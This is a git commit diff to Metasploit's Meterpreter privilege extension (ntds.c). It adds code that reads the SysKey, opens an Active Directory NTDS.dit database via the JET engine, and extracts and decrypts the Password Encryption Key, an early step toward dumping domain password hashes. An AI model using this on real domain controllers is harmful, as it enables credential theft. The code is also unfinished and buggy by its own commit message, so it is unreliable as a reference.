ac0978abcd0a5251a3da1e79be12188c0b07a463
David Maloney <DMaloney@rapid7.com>
2015-04-23 14:43:28 -0500

    attaching database correctly
    we have the database attaching properly
    seems to be an error decrypting the PEK though
    
    MSP-12356

--- c/meterpreter/source/extensions/priv/server/ntds.c
+++ c/meterpreter/source/extensions/priv/server/ntds.c
@@ -8,7 +8,7 @@ typedef struct
 
 
 DWORD ntds_parse(Remote *remote, Packet *packet){
-	Packet *response = NULL;
+	Packet *response = packet_create_response(packet);
 	DWORD res = ERROR_SUCCESS;
 	jetState *ntdsState = malloc(sizeof(jetState));
 	PCHAR filePath = packet_get_tlv_value_string(packet, TLV_TYPE_NTDS_PATH);
@@ -18,10 +18,62 @@ DWORD ntds_parse(Remote *remote, Packet *packet){
 		goto out;
 	}
 	strncpy(ntdsState->ntdsPath, filePath, 255);
+
 	// Attempt to get the SysKey from the Registry
 	unsigned char sysKey[17];
 	if (!get_syskey(sysKey)){
 		res = GetLastError();
+		goto out;
+	}
+
+
+	// Create the structure for holding all of the Column Definitions we need
+	ntdsColumns *accountColumns = malloc(sizeof(ntdsColumns));
+	memset(accountColumns, 0, sizeof(ntdsColumns));
+
+	JET_ERR startupStatus = engine_startup(ntdsState);
+	if (startupStatus != JET_errSuccess){
+		exit(startupStatus);
+	}
+	// Start a Session in the Jet Instance
+	JET_ERR sessionStatus = JetBeginSession(ntdsState->jetEngine, &ntdsState->jetSession, NULL, NULL);
+	if (sessionStatus != JET_errSuccess){
+		JetTerm(ntdsState->jetEngine);
+		res = sessionStatus;
+		goto out;
+	}
+	JET_ERR openStatus = open_database(ntdsState);
+	if (openStatus != JET_errSuccess){
+		JetEndSession(ntdsState->jetSession, (JET_GRBIT)NULL);
+		JetTerm(ntdsState->jetEngine);
+		res = openStatus;
+		goto out;
+	}
+	JET_ERR tableStatus = JetOpenTable(ntdsState->jetSession, ntdsState->jetDatabase, "datatable", NULL, 0, JET_bitTableReadOnly | JET_bitTableSequential, &ntdsState->jetTable);
+	if (tableStatus != JET_errSuccess){
+		engine_shutdown(ntdsState);
+		res = tableStatus;
+		goto out;
+	}
+	JET_ERR columnStatus = get_column_info(ntdsState, accountColumns);
+	if (columnStatus != JET_errSuccess){
+		engine_shutdown(ntdsState);
+		res = columnStatus;
+		goto out;
+	}
+	JET_ERR pekStatus;
+	encryptedPEK *pekEncrypted = malloc(sizeof(encryptedPEK));
+	decryptedPEK *pekDecrypted = malloc(sizeof(decryptedPEK));
+	memset(pekEncrypted, 0, sizeof(encryptedPEK));
+	memset(pekDecrypted, 0, sizeof(decryptedPEK));
+
+	pekStatus = get_PEK(ntdsState, accountColumns, pekEncrypted);
+	if (pekStatus != JET_errSuccess){
+		res = pekStatus;
+		goto out;
+	}
+	if (!decrypt_PEK(sysKey, pekEncrypted, pekDecrypted)){
+		res = ERROR_DECRYPTION_FAILED;
 		goto out;
 	}
 
